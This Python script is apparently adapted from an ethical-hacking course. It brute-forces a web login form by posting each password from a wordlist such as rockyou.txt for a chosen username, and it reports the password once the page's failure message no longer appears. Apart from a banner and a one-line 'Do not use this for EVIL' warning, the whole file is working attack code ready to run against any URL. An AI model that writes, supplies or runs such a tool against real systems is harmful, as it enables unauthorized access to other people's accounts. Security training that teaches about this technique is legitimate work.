## Simple Brute Forcer
## This code is based on the Udemy Class "Python For Ethical Hackers: Build Web App Login Brute-Force"found at https://www.udemy.com/course/python-for-ethical-hackers-build-web-app-login-brute-force/learn/lecture/25517118 
## Some modifications have been added for aesthetics

import pyfiglet  
import requests
from termcolor import colored

ascii_banner1 = pyfiglet.figlet_format("S I M P L E")
ascii_banner2 = pyfiglet.figlet_format("BRUTE FORCER")
print(ascii_banner1)
print(ascii_banner2)
print("This script requires you use a password list like rockyou.txt")
print("Make sure you execute the script from the SAME DIRECTORY that the password file is in!")
print("Before running the Bruteforcer, manually try a wrong password on the login. Note the string that is returned when you fail (example: Bad Login, Unauthorized User, etc). The script will need that string to work properly")
print("Do not use this for EVIL")


url = input('[+] Enter Page URL: ')
username = input('[+] Enter login for the account to Bruteforce: ')
password_file = input('[+] Enter the password file to use: ')
login_failed_string = input('[+] Enter the string that occurs when the login fails: ')

def cracking(username,url):
	for password in passwords:
	    password = password.strip()
	    print(colored(('Trying: ' + password), 'red'))
	    data = {'username':username,'password':password,'Login':'submit'}
	    response = requests.post(url, data=data)
	    if login_failed_string in response.content.decode():
	    	pass
	    else:
	    	print(colored(('[+] Great Success! Username Found: ==> ' + username), 'green'))
	    	print(colored(('[+] Great Success! Password Found: ==> ' + password), 'green'))
	    	exit()
	    	
with open(password_file, 'r') as passwords:
	cracking(username,url)
print('[!!] Password not found in list')

